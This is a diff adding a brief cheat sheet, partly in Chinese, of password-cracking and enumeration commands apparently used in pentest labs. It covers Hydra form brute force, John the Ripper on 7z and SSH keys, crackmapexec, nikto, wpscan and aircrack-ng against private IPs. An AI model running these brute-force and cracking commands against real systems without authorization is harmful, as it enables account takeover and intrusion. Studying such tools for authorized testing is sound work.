@@ -1,0 +1,54 @@
+## CRACK TOOLS
+
+Hydra
+
+```bash
+爆破前端表单
+hydra 172.20.10.3 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l xekOnerR -P /usr/share/wordlists/rockyou.txt
+```
+
+John
+
+```bash
+破解7z压缩包密码
+7z2john 1 > 2.hash
+john --format=7z 2.hash -w /usr/share/wordlist/rockyou.txt
+
+破解ssh私钥登录密码
+shh2john 1 > 2.hash
+john 2.hash -w /usr/share/wordlist/rockyou.txt
+```
+
+crackmapexec
+
+```bash
+crackmapexec ssh 172.20.10.3 -u creds -p creds [--]
+速度慢 ， 协议全
+```
+
+nikto (web)
+
+```bash
+ nikto -host 172.20.10.6
+```
+
+wpscan (wordpress crack)
+
+```bash
+wpscan --url <URL> -e at -e ap -e u
+-e --enumerate 枚举
+at 枚举所有主题
+ap 枚举所有插件
+u 枚举用户名
+```
+
+```bash
+wpscan --url http://192.168.15.135/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
+```
+
+aircrack-ng (WIFI)
+
+```bash
+aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
+```
+
